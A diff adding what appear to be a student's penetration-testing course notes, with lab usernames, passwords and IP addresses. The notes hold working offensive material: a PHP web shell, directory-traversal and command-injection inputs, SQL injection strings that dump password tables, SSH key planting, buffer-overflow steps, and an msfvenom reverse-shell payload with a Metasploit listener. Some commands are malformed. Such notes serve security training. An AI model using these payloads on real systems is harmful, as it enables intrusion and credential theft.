@@ -1,0 +1,236 @@
+Username	    Password	        lin.internet
+RONE-003-M 	    HrrxSbU2XogVl3y 	10.50.31.120    
+
+ACCESS CTFd 10.50.22.9:8000
+
+ADDRESSES
+LIN 192.168.65.20, 10.50.29.36
+WIN 192.168.65.10, 10.50.30.187
+    CREDS  student:password
+
+RDP xfreerdp /v:10.50.30.187 /u:student /p:password /dynamic-resolution +clipboard
+SSH ssh -X student@10.50.29.36
+
+Phases and Methodology of a Pen Test
+    1) Mission Def'n
+        - the scope of the mission and RoE
+    2) Recon
+        - we aren't interacting with the target. public resource information gathering
+    3) Footprinting
+        - accumulate data thru interaction. scanning target resources
+    4) Exploit (Initial Access)
+        - gain initial foothold on network
+    5) Post-Exploitation
+        - establish persistence, escalate privilege, cover tracks
+    6) Document
+        - document/report mission details. do this throughout the whole process
+        OPNOTES, Formalized Reporting
+
+        The Formal Report:
+            Executive Summary (BAMF)
+            Technical Summary
+            - include screen shots, commands, details, links
+
+
+Exploitation Research
+    Understand how to achieve initial access and what it will provide, pair vulnerability to exploit, id req
+    The most common method for gaining initial access is phishing. There is also shoulder surfing, finding passwords on paper, whaling, spearphishing
+    Two open sources for finding exploits: rapid7, exploitdb
+    TEST the exploit to improve time and knowledge of it
+
+
+    cat /etc/os-release
+    lsb_release -h
+    lsb_release -a
+
+    uname -a (get kernel version)
+
+    hostname/hostnamectl
+
+Limitation On Collection
+    Follow the RoE & Titles we are working under
+
+Collecting Data
+    Web Data - Cached Content, Analytics, Proxy Web Application, Command Line Interrogation
+    Sensitive Data - Business Data, Profiles, Non-Profits/Charities, Business Filings, Historical and Public Listings
+    Publicly Accessible - Physical Addresses, Phone Numbers, Email Addresses, User Names, Search Engine Data, Web and Traffic Cameras, Wireless Access Point Data
+    Social Media - Twitter, Facebook, Instagram, People Searches, Registry and Wish Lists
+    Domain and IP Data - DNS Registration, IP Address Assignments, Geolocation Data, Whois
+
+    utilizing python http/xpath modules, you can obtain and parse public facing websites.
+
+Scanning
+    Scanning takes the form of:
+    Host Discovery: find out if a host exists/is online
+        for i in {1..254} ;do (ping -c 1 192.168.1.$i | grep "bytes from" &) ;done
+    Host Enumeration: find ports for each host that is online
+        for i in {1..1024} ;do (nc -w 3 x.x.x.x $i) ;done
+        nmap x.x.x.x                            #scan common ports
+        nmap x.x.x.x -p-                        #scan all ports
+        nmap x.x.x.x -p 22,23,24                #scan specified port(s)
+    Host Interrogation: find what service is running on each port
+        nmap -sV x.x.x.x [-p]                   #finds services
+        nmap --script=banner.nse x.x.x.x        #interrogate services through the banner grab script
+        nmap --script=smb-os-discovery.nse (..) #utilize smb to find the host name and other information of the machine
+
+NMAP Scripting 
+    You can run a script by adding the -sC option when running nmap to use default scripts, or you can use --script=<name> to specify a specific script
+    locations of default scripts: /usr/share/nmap/scripts
+    for example, you can get better banner grabbing by using --script=banner.nse
+    you can also specify by a category. you can use: --script="category" to use all scripts in a specific category
+    you can view the scripts via: https://nmap.org/nsedoc/scripts/
+
+Web Exploitation
+    The server/client relationship - this is a synchronous communication between a user and a service. The client only sees what is granted by the implementer.
+    
+    HTTP - defined in RFC 2616 (ver 1.1), is a means to distribute data through hypermedia (hypertext (software system that links what you read with gfx on a computer screen), but withsound and video) information systems. The syntax of the metadata is considered MIME-like, which is a series of commands that are sent between the client and server to do something.This protocol is a request/response protocol. A client sends a request, followed by a MIME-like message containing request modifiers, client info, and possible body content.
+        http_URL = "http:" "//" host [ ":" port ] [ abs_path [ "?" query ]]
+        Methods: OPTIONS, GET, HEAD, POST, PUT, DELETE, TRACE, CONNECT, (extension-methods)
+    - 1xx: Informational - Request received, continuing process
+    - 2xx: Success - The action was successfully received,
+        understood, and accepted
+    - 3xx: Redirection - Further action must be taken in order to
+        complete the request
+    - 4xx: Client Error - The request contains bad syntax or cannot
+        be fulfilled
+    - 5xx: Server Error - The server failed to fulfill an apparently
+        valid request
+    
+    How can we use this to enummerate a machine?
+        Robots.txt, legitimate surfing, or tools such as NSE scripts, nikto, or burp suite
+        Use nse scripts with nmap like: http-robots.txt.nse, http-enum.nse, http-email.nse
+        We explore these directories that we find in the robots.txt file. This gives us information about the folder structure of the server.
+
+    Directory Traversal (Server-side Injection) - a vulnerability with POST, where you can break out of the server's container and traverse the file system
+        PUT - attempt to break out of the container you were put in
+            1) try ../../../../../../../../../file/to/steal
+                /etc/passwd - users
+                /etc/group - groups
+                /etc/hosts - ip to hostname map
+                /etc/resolv.conf - dns
+                /etc/networks - network to name map
+        in the url: /myscript.php?myvariablefilename=../../../../../../file/to/steal&Submitvariable=text
+
+    Malicious File Upload - uploading a file that is malicious, utilizing an exploit or malware, that allows code execution
+        File extensions can't be sanitized or this won't work.
+        You need to be able to navigate to that script (js or php) file in the file structure, thus executing the script, or it won't work
+        The script you have could allow remote execution via a command prompt/terminal
+        <HTML><BODY><Form METHOD="" NAME="badform" ACTION=""><INPUT TYPE="text" NAME="cmd"><INPUT TYPE="submit" VALUE="hello"></Form> <?php system($_GET['cmd']);?></BODY></HTML>
+
+    Command Injection - When an application on a server is vulnerable by allowing execution of arbitrary data.
+        Test this by entering a command such as ; id
+        This MAY ALSO be vulnerable to directory traversal.
+
+    SSH can be utilized with command injection or malicious file uploads to move keys to the server:
+        1. generate the ssh key on the host you want to login from
+            ssh-keygen -t rsa -b 4096
+            cat ~/.ssh/id_rsa.pub
+            copy the key to clipboard
+            get the user that is logged into the webserver (using one of the previous exploit methods) (whoami)
+            get that users home directory (cat /etc/passwd) and login shell
+            ls -la /var/www to confirm there is a .ssh directory, if there isnt, create one
+            mkdir /home/path/of/user/.ssh
+            inject the generated key into the authorized key file
+            echo >> "" /var/www/.ssh/authorized_keys
+            echo >> "key you copied" >> /var/www/.ssh 
+            check it
+
+Web Exploitation II 
+    MySQL command/syntax
+        USE, SELECT, UPDATE, DELETE, INSERT INTO, CREATE DATABASE, ALTER DATABASE, CREATE TABLE, ALTER TABLE, DROP TABLE, CREATE INDEX, DROP INDEX, UNION
+    mysql --user=zyx --pass=whatever
+show databases;
+    -> we are targeting information_schma and custom databases most of the time
+show tables from db;
+    -> show all the tables that exist in the db database
+select <column or *> from db.TableName;
+    -> show a table that exists in the db database, specifying a list of columns or * to select all
+    -> you can use UNION to bring two table queries together
+describe db.MyTable 
+    -> view atributes of a tabl
+
+2 Methods of doing SQL injection - the POST method, and the GET method.
+    - During POST, after behavior analysis, we input into our text box <value>'or 1='1; OR ; # OR ; --
+     <value> is a valid value of the table
+     you place ; or ; # or ;-- at the end. This is an appended hack that fixes problems
+     once we get one of the working values, we can go further:
+        <value>' UNION select 1,2,3,4, etc and keep increasing the number to find the number of columns in the table. you do this because the table may have
+        more columns that the webpage just isn't displaying, but you need to have all required columns when printing them out or it will print nothing
+
+        golden statement: select table_schema, 2, table_name, column_name, 5 from information_schema.columns; <appended hack>
+        get passwords: select id,2,name,pass,5 from session.user; <appended hack>
+        
+        note that the amount of columns matches the output. you must attempt to print out random numbers until all columns are visible, along with non-visible columns
+        after this, you find out which columns actually get output in the webpage. in the example above, 2 and 5 don't matter, they dont get printed to the webpage, so we 
+        can just put placeholders there.
+    - During GET, after behaviour analysis (make sure you observe the url change), you still apply a generic truth statement <value> or 1=1; OR ; # OR ; -- with the appended hack
+    then you determine the number of columns that exist in the table, as opposed to what is actually displayed
+        URL...Selection=1 or 1=1<appended hack>
+    now, count the rows and columns and "fuzz" based on the lowest number. 
+        select 1,2,3...<appended hack>
+        if you get back the numbers in the bottom row, you now have the row count
+        select id,name,pass from session.user
+        or get all table info
+        select table_schema,column_name,table_name from information_schema.columns
+
+    load_file Function:
+        you can use load_file('name/of/file') in place of a column and load the whole file. This can access any file on the machine
+    escaping characters:
+        \ is used to escape characters.
+
+Reverse Engineering
+    x86_64 ASSEMBLY - 16 general purpose 64 bit registers. 
+        %rax first return register
+        %rbp base pointer that keeps track of the base of the stack
+        %rsp stack pointer that points to top of the stack
+Exploit Development
+    Once you find a binary and you can develop an exploit for it: 
+        1) run the program. find out what it does, and if it takes user input
+        2) strings can be run against the binary for additional information
+        3) run gdb against it (gdb filename)
+            - find vulnerabilities within the program: use pdisass against a known function
+                pdisass main -> look for functions that exist here
+                pdisass <func found in main>
+                ...etc
+                look for a red-colored function and research it to see if there is a buffer overflow for the function
+        4) use wiremask to get a buffer overflow fuzzing string, then use gdb -> run and get the next instruction pointer (which caused the crash)
+        5) use the instruction pointer on wiremask to get an offset
+            - now, you have the offset required to start a buffer overflow and you have the function to overflow.
+        6) use this information to create the exploit   
+            - in peda, feed input by using run <<< $(my command), or run $(my command) if the binary wants a parameter
+        7) now using the exploit requires no other memory related data besides the binary. we need to strip down gdb for this.
+            env - gdb filename (use gdb without peda or other major env variables)
+            show env; unset env XYZ (unset the rest of the env variables, so that gdb is fully stripped down)
+        8) overflow the program manually again, then check the entire heap of the program using:
+            run
+            <trigger overflow>
+            info proc map       
+            look for the [heap] portion, and grab the start addr on the line under the [heap] line (this is where the heap starts, most of the time starts with 0xf7...)
+                0xf7de2000
+            look for the [stack], and grab the end addr on the same line as the [stack] in (this is where the heap ends). if you get an error, use the address immediately above this line
+                0xffffe000
+        9) now find these address ranges to list out all JMP instructions that we can use to inject our funciton, however we are uncluding 2 intel asm instructions (0xff JMP, 0xe4 ESP)
+                find /b 0xf7de2000, 0xffffe000, 0xff, 0xe4
+        10) grab a chunk of these addresses so we can assign this to our exploit function, then paste it into our script in little-endian order
+                0xf7f66497 -> eip="\x97\x64\xf6\xf7"
+        11) attach the actual shellcode to the exploit, so we can do what we want
+            LIN PAYLOAD:     msfvenom -p linux/x86/exec cmd="whoami" -b '\x00' -f python
+            WINDOWS PAYLOAD: msfvenom -p windows/shell_reverse_tcp LHOST=LINUX_OP_STATION LPORT=MADE_UP -b '\x00' -f python
+        metasploit: windows/shell_reverse_tcp
+                    lhost = 0.0.0.0
+                    lport = 5555
+
+
+
+
+
+
+
+
+
+
+msf6 > use multi/handler
+msf6 exploit(multi/handler) > set payload windows/shell_reverse_tcp
+msf6 exploit(multi/handler) > set lhost 0.0.0.0
+msf6 exploit(multi/handler) > set lport 5555
+msf6 exploit(multi/handler) > show options
